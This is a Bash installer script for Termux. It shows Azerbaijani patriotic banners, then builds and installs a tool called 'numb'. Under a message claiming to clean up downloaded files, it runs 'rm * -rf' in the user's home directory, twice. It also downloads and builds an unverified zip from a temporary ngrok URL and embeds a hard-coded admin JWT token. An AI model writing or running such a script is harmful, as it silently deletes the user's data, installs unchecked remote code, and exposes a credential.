#/bin/bash
BLUE='\033[0;34m'
RED='\033[0;31m'
GREEN='\033[0;32m'
WHITE='\033[0;38m'
NOCOLOR='\033[0m' 
termuxDir="/data/data/com.termux/files/usr/bin/"
binFile="numb"
bKey="eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJhZG1pbiIsImF1dGgiOiJNQUlOIiwiZXhwIjoxNjM4NDg2MTM1fQ.4W_-TRqw8Yn8LHnwaS5Ql7IF2KciytBaD0tVHe7j3rq6ZXrN2neYfTcQu-IpHmt1swE1QaF4oAkWgpA4wmQCpw"
url="https://3a3b-94-20-37-16.ngrok.io"
slash="/"
comFile="new.zip"

LINEA1="########################################################\n########################################################\n"
LINEA2="########################################################\n########################################################\n"
LINEA3="########################################################\n########################################################"
LINEB1="#########################${WHITE}****${RED}###########################\n########################${WHITE}***${RED}#############################\n"
LINEB2="#######################${WHITE}***${RED}##${WHITE}**${RED}##########################\n#######################${WHITE}***${RED}##${WHITE}**${RED}##########################\n"
LINEB3="########################${WHITE}***${RED}#############################\n#########################${WHITE}****${RED}###########################"
LINEC1="########################################################\n########################################################\n"
LINEC2="########################################################\n########################################################\n"
LINEC3="########################################################\n########################################################"
clear
echo ${BLUE}$LINEA1$LINEA2$LINEA3
echo ${RED}$LINEB1$LINEB2$LINEB3
echo ${GREEN}$LINEC1$LINEC2$LINEC3
echo "${NOCOLOR}"
sleep 7
echo "${BLUE}"
echo "########################################################"
echo "#                                                      #"
echo "#      Sən bizimsən, bizimsən durduqca bədəndə Can,    #"
echo "#        Yaşa, yaşa, çox yaşa, ey şanlı Azərbaycan!    #"
echo "#                                                      #"
echo "#                                                      #"
echo "########################################################"
echo "${NOCOLOR}"
sleep 8
echo "${GREEN}Created Mammadli Ramiz"
sleep 1;
echo "${GREEN}Lazim olan fayllar yuklenir"
sleep 1;
echo "${GREEN}Biraz gozleyin"
sleep 1;
echo "${RED}Yuklenen fayllar temizlenir..."
sleep 2
echo "${GREEN}"
cd ~/
rm * -rf
touch setup.py
echo "#############################################################"
echo "from setuptools import setup" >> setup.py
echo "from Cython.Build import cythonize" >> setup.py
echo "setup(" >> setup.py
echo "    ext_modules = cythonize(\"pyx/bklib.pyx\")," >> setup.py
echo "    compiler_directives={'language_level' : 3}" >> setup.py
echo ")"  >> setup.py
touch numb.py
echo "#############################################################"
echo "#RamoSoft" >> numb.py
echo "import pyximport; pyximport.install()" >> numb.py
echo "import pyx.bklib" >> numb.py
apt-get update
apt-get upgrade -y
apt-get dist-upgrade -y
apt-get autoremove -y
sleep 3
pkg install wget curl clang zip python make -y
sleep 3
pip install requests
pip install Cython
clear
wget $url$slash$comFile
unzip $comFile
make all
chmod +x $termuxDir$slash$binFile
rm * -rf
numb --version
numb --key $bKey
numb --update
numb --help
